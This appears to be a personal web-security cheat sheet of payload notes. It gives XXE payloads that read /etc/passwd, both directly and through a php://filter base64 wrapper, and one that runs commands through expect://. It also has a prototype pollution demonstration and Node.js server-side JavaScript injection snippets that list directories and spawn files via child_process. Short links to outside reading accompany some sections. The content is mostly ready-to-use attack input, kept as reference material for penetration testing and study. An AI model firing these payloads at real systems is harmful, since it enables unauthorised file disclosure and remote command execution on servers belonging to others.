## XXE:  
Entities declaration: this type of entity declaration is called internal declaration as everything is defined inside the same document and nothing needs to be fetched externally.  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY name "James Jones">
]>
<student>&name;</student>
```

**External entities**:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY sname SYSTEM "https://www.prakharprasad.com/external.xml">
]>
<student>&sname;</student>
```  

**Simple XXE attack: reading files**.  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "file:///etc/passwd">
]>
<student>
	<name>&oops;</name>
</student>
```  

**Simple XXE attack: PHP Base64 conversion URI as an alternative**. (php://filter/convert.base64-encode/resource=/file/to/read)  
```
<!DOCTYPE student [
	<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<student>
	<name>&pwn;</name>
</student>
```  

**RCE thtough XXE**:  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
	<!ENTITY rce SYSTEM "expect://id">]>
<student>
	<name>&rce;</name>
</student>
```  

## Prototype Pollution:  
```
var book = {bookName: "Book name", authorName: "Author of book"};
console.log(book.toString())
//output: “[object Object]”

book.__proto__.toString = ()=>{alert("polluted")}
console.log(book.toString())
// alert box pops up: “polluted”

IMAGE: alert pops up with value “polluted”
```
**Additional resources**:  
https://www.mend.io/resources/blog/prototype-pollution-vulnerabilities/  
https://guidesmiths.github.io/cybersecurity-handbook/attacks_explained/prototype_pollution  
https://youtu.be/W9_x8pc_bh8  
https://youtu.be/Z6CtDSx8C5k


## MASS ASSIGNMENT ATTACK:

**Additional information**:  
https://youtu.be/r1j0COUMTqw  

## ONLINE DECOMPILER:  
https://dogbolt.org  

## JavaScript:  

**SSJI**: JavaScript injection (Node.js)  
1. Listing directories and read files: response.end(require('fs').readdirSync('.').toString()  
2. Execute file on filesystem: require('child_process').spawn(filename);   

**Additional information**: 
1. HTTP Networking: https://www.freecodecamp.org/news/http-full-course/  
2. 
